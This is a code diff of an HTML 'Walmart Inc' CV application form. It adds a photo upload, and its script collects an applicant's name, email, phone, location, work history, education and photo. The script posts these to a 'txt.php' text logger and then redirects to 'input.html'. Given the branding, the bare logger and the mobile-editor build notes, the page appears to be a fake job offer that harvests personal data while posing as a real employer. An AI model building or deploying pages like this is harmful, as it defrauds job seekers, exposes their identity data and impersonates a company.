@@ -6,7 +6,7 @@
     <title>Walmart Inc - Professional CV Form</title>
     <link rel="preconnect" href="https://googleapis.com">
     <link rel="preconnect" href="https://gstatic.com" crossorigin>
-    <link href="https://googleapis.com/css2?family=Inter:wght@400;600;700&family=Merriweather:ital,wght@0,300;0,400;1,300&display=swap" rel="stylesheet">
+    <link href="https://googleapis.com" rel="stylesheet">
     
     <style>
         body {
@@ -14,7 +14,7 @@
             font-weight: 300;
             line-height: 1.6;
             margin: 0;
-            padding: 10px; /* Reduced default padding for small screen edges */
+            padding: 10px;
             background-color: #f4f4f9;
             color: #2c3e50;
         }
@@ -22,7 +22,7 @@
             max-width: 800px;
             margin: 10px auto;
             background: #fff;
-            padding: 20px; /* Reduced padding for compact screens */
+            padding: 20px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
             border-radius: 8px;
             box-sizing: border-box;
@@ -30,7 +30,7 @@
         .top-banner {
             font-family: 'Inter', sans-serif;
             text-align: center;
-            font-size: 11px; /* Slightly smaller for global mobile wrapping */
+            font-size: 11px;
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 1.5px;
@@ -43,6 +43,52 @@
             border-bottom: 2px solid #1a252f;
             padding-bottom: 20px;
             margin-bottom: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .profile-image-container {
+            margin-bottom: 15px;
+            position: relative;
+        }
+        .profile-image-label {
+            display: block;
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 2px dashed #ccc;
+            background: #fafafa;
+            cursor: pointer;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+        .profile-image-label:hover {
+            border-color: #1a252f;
+            background: #f0f3f4;
+        }
+        .profile-image-label img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .profile-image-placeholder {
+            font-family: 'Inter', sans-serif;
+            font-size: 24px;
+            color: #7f8c8d;
+            text-align: center;
+        }
+        .profile-image-text {
+            font-size: 9px;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #95a5a6;
+        }
+        input[type="file"] {
+            display: none;
         }
         input[type="text"], textarea {
             width: 100%;
@@ -55,7 +101,7 @@
             border-radius: 4px;
             margin-bottom: 5px;
             transition: all 0.3s ease;
-            font-size: 14px; /* Fixes iOS zoom on focus issue */
+            font-size: 14px;
         }
         input[type="text"]:focus, textarea:focus {
             border-color: #1a252f;
@@ -70,18 +116,21 @@
         h1 input {
             font-family: 'Inter', sans-serif;
             text-align: center;
-            font-size: 22px; /* Responsive size */
+            font-size: 22px;
             font-weight: 700;
             text-transform: uppercase;
             letter-spacing: 1px;
             color: #1a252f;
+        }
+        .contact-info {
+            width: 100%;
         }
         .contact-info input {
             font-family: 'Inter', sans-serif;
             text-align: center;
             font-size: 12px;
             color: #555;
-            width: 100%; /* Spans full header text container on mobile */
+            width: 100%;
             margin: 6px auto;
             display: block;
             letter-spacing: 0.5px;
@@ -100,10 +149,9 @@
         textarea {
             resize: vertical;
         }
-        /* Grid architecture modified to support seamless mobile breakdown */
         .grid-row {
             display: flex;
-            flex-direction: column; /* Default stack on mobile screens */
+            flex-direction: column;
             gap: 5px;
             margin-bottom: 5px;
         }
@@ -153,7 +201,7 @@
             text-transform: uppercase;
             letter-spacing: 1px;
             padding: 12px 0;
-            width: 100%; /* Full-width buttons are easier to tap on mobile views */
+            width: 100%;
             max-width: 280px;
             border: none;
             border-radius: 4px;
@@ -164,52 +212,29 @@
             background-color: #2c3e50;
         }
 
-        /* Desktop and Tablet Responsive Optimization Rules */
         @media (min-width: 600px) {
-            body {
-                padding: 20px;
-            }
-            .container {
-                padding: 40px;
-                margin: 30px auto;
-            }
-            .top-banner {
-                font-size: 13px;
-                letter-spacing: 2px;
-            }
-            h1 input {
-                font-size: 26px;
-                letter-spacing: 1.5px;
-            }
-            .contact-info input {
-                width: 85%;
-            }
-            .grid-row {
-                flex-direction: row; /* Align horizontal on desktop views */
-                justify-content: space-between;
-                gap: 15px;
-            }
-            .grid-row input:last-child {
-                text-align: right;
-                font-weight: 400;
-                color: #555;
-            }
-            .submit-application-btn {
-                padding: 12px 35px;
-                width: auto;
-            }
+            body { padding: 20px; }
+            .container { padding: 40px; margin: 30px auto; }
+            .top-banner { font-size: 13px; letter-spacing: 2px; }
+            h1 input { font-size: 26px; letter-spacing: 1.5px; }
+            .contact-info input { width: 85%; }
+            .grid-row { flex-direction: row; justify-content: space-between; gap: 15px; }
+            .grid-row input:last-child { text-align: right; font-weight: 400; color: #555; }
+            .submit-application-btn { padding: 12px 35px; width: auto; }
         }
 
         @media print {
             body { background-color: #fff; padding: 0; }
             .container { box-shadow: none; margin: 0; padding: 0; max-width: 100%; }
-            input[type="text"], textarea { 
+            input[type="text"], textarea, .profile-image-container { 
                 border: none !important; 
                 background: transparent !important; 
                 padding: 0 !important; 
                 margin: 0 !important;
                 box-shadow: none !important;
             }
+            .profile-image-label { border: none !important; cursor: default; }
+            .profile-image-text { display: none; }
             .grid-row { flex-direction: row; justify-content: space-between; }
             .grid-row input:last-child { text-align: right; }
             ::placeholder { color: transparent !important; }
@@ -224,89 +249,84 @@
     <div class="top-banner">Walmart Inc. Career Opportunity</div>
 
     <form id="cvForm">
-              <header>
-            <!-- Added id="fullName" here -->
+        <header>
+            <div class="profile-image-container">
+                <label for="clientImageInput" class="profile-image-label" id="imageLabel">
+                    <div class="profile-image-placeholder" id="imagePlaceholder">
+                        📷<br><span class="profile-image-text">Add Photo</span>
+                    </div>
+                </label>
+                <input type="file" id="clientImageInput" accept="image/*">
+            </div>
+
             <h1><input type="text" id="fullName" placeholder="YOUR FULL NAME" required></h1>
             <div class="contact-info">
-                <!-- Added id="contactLine1" here -->
-              
-                <!-- Added id="contactLine2" here -->
                 <input type="text" id="contactLine1" placeholder="✉️ EMAIL ADDRESS" required>
-           <input type="text" id="contactLine2" placeholder="📍 City, Country | 📞 Phone Number (with country code)" required>  
-           
-             
+                <input type="text" id="contactLine2" placeholder="📍 City, Country | 📞 Phone Number (with country code)" required>  
             </div>
         </header>
 
+        <section>
+            <h2>Professional Summary</h2>
+            <textarea id="summary" rows="3" placeholder="Write a short summary..." required></textarea>
+        </section>
 
-      <section>
-    <h2>Professional Summary</h2>
-    <textarea id="summary" rows="3" placeholder="Write a short summary..." required></textarea>
-</section>
+        <section>
+            <h2>Core Skills</h2>
+            <textarea id="skills" rows="4" placeholder="• Professional Competencies..."></textarea>
+        </section>
 
-<section>
-    <h2>Core Skills</h2>
-    <textarea id="skills" rows="4" placeholder="• Professional Competencies..."></textarea>
-</section>
+        <section>
+            <h2>Professional Experience</h2>
+            
+            <div class="job">
+                <div class="grid-row">
+                    <input type="text" id="job1Title" placeholder="Most Recent Job Title / Role" required>
+                    <input type="text" id="job1Dates" placeholder="Month YYYY – Present" required>
+                </div>
+                <div class="sub-text">
+                    <input type="text" id="job1Company" placeholder="Company Name, City, Country" required>
+                </div>
+                <ul>
+                    <li><textarea id="job1Bullet1" rows="2" placeholder="Key Achievement 1..." required></textarea></li>
+                    <li><textarea id="job1Bullet2" rows="2" placeholder="Key Achievement 2..." required></textarea></li>
+                </ul>
+            </div>
 
+            <div class="job" style="margin-top: 20px;">
+                <div class="grid-row">
+                    <input type="text" id="job2Title" placeholder="Previous Job Title / Role">
+                    <input type="text" id="job2Dates" placeholder="Month YYYY – Month YYYY">
+                </div>
+                <div class="sub-text">
+                    <input type="text" id="job2Company" placeholder="Company Name, City, Country">
+                </div>
+                <ul>
+                    <li><textarea id="job2Bullet1" rows="2" placeholder="Describe your primary responsibility..."></textarea></li>
+                </ul>
+            </div>
+        </section>
 
-      <section>
-    <h2>Professional Experience</h2>
-    
-    <!-- Job 1 -->
-    <div class="job">
-        <div class="grid-row">
-            <input type="text" id="job1Title" placeholder="Most Recent Job Title / Role" required>
-            <input type="text" id="job1Dates" placeholder="Month YYYY – Present" required>
-        </div>
-        <div class="sub-text">
-            <input type="text" id="job1Company" placeholder="Company Name, City, Country" required>
-        </div>
-        <ul>
-            <li><textarea id="job1Bullet1" rows="2" placeholder="Key Achievement 1..." required></textarea></li>
-            <li><textarea id="job1Bullet2" rows="2" placeholder="Key Achievement 2..." required></textarea></li>
-        </ul>
-    </div>
-
-    <!-- Job 2 -->
-    <div class="job" style="margin-top: 20px;">
-        <div class="grid-row">
-            <input type="text" id="job2Title" placeholder="Previous Job Title / Role">
-            <input type="text" id="job2Dates" placeholder="Month YYYY – Month YYYY">
-        </div>
-        <div class="sub-text">
-            <input type="text" id="job2Company" placeholder="Company Name, City, Country">
-        </div>
-        <ul>
-            <li><textarea id="job2Bullet1" rows="2" placeholder="Describe your primary responsibility..."></textarea></li>
-        </ul>
-    </div>
-</section>
-
-
-       <section>
-    <h2>Education</h2>
-    <div class="education-item">
-        <div class="grid-row">
-            <input type="text" id="eduDegree" placeholder="Degree, Major..." required>
-            <input type="text" id="eduDates" placeholder="Graduation Year..." required>
-        </div>
-        <div class="sub-text">
-            <input type="text" id="eduSchool" placeholder="University..." required>
-        </div>
-        <ul>
-            <li><textarea id="eduBullet" rows="1" placeholder="Academic honors..."></textarea></li>
-        </ul>
-    </div>
-</section>
-
+        <section>
+            <h2>Education</h2>
+            <div class="education-item">
+                <div class="grid-row">
+                    <input type="text" id="eduDegree" placeholder="Degree, Major..." required>
+                    <input type="text" id="eduDates" placeholder="Graduation Year..." required>
+                </div>
+                <div class="sub-text">
+                    <input type="text" id="eduSchool" placeholder="University..." required>
+                </div>
+                <ul>
+                    <li><textarea id="eduBullet" rows="1" placeholder="Academic honors..."></textarea></li>
+                </ul>
+            </div>
+        </section>
 
         <footer>
             I hereby certify that the information provided above is true, complete, and accurate.
         </footer>
 
-        <!-- Submit Button Element Container with External Link -->
-             <!-- Replace your current footer button container with this -->
         <div class="submit-btn-container">
             <button type="submit" class="submit-application-btn">Submit Application</button>
         </div>
@@ -314,17 +334,31 @@
 </div>
 
 <script>
+let base64ImageString = "";
+
+document.getElementById('clientImageInput').addEventListener('change', function(event) {
+    const file = event.target.files[0];
+    if (file) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            base64ImageString = e.target.result;
+            const label = document.getElementById('imageLabel');
+            label.innerHTML = `<img src="${base64ImageString}" alt="Profile Preview">`;
+        };
+        reader.readAsDataURL(file);
+    }
+});
+
 document.getElementById('cvForm').addEventListener('submit', function(event) {
     event.preventDefault();
 
-    // Helper utility to safely grab field values without crashing
     const getValue = (id, fallback = '') => {
         const element = document.getElementById(id);
         return element ? element.value : fallback;
     };
 
-    // 1. Gather all inputs from your newly-fixed form fields
     const cvData = {
+        clientImage: base64ImageString,
         fullName: getValue('fullName'),
         contactLine1: getValue('contactLine1'),
         contactLine2: getValue('contactLine2'),
@@ -348,12 +382,8 @@ document.getElementById('cvForm').addEventListener('submit', function(event) {
         eduBullet: getValue('eduBullet', 'N/A')
     };
 
-    // 2. Immediate Save to phone storage so 'input.html' renders perfectly
     localStorage.setItem('applicantCVData', JSON.stringify(cvData));
 
-    // 3. Fire-and-forget network stream to your web server text logger
-    // NOTE: When testing in TrebEdit preview, this background fetch might fail locally,
-    // but the '.catch' block ensures your screen still swaps instantly without getting stuck!
     fetch('txt.php', {
         method: 'POST',
         headers: {
@@ -365,17 +395,10 @@ document.getElementById('cvForm').addEventListener('submit', function(event) {
         window.location.assign('input.html');
     })
     .catch(error => {
-        // Safe bypass tracking for phone preview software environments
         window.location.assign('input.html');
     });
 });
 </script>
-
-
-
-
-    </form>
-</div>
 
 </body>
 </html>
